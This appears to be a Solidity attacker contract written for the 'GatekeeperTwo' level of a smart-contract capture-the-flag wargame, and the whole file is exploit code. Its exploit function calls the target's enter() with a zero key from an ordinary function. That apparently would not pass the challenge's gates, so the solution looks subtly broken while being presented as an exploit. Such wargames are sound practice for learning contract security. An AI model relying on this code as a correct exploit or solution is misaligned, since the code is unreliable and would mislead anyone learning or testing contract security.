// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/14_gatekeepertwo.sol";

contract AttackerGatekeeperTwo {
    function exploit(address gatekeeperTwo) public payable {
        GatekeeperTwo(gatekeeperTwo).enter(bytes8(uint64(0)));
    }
}
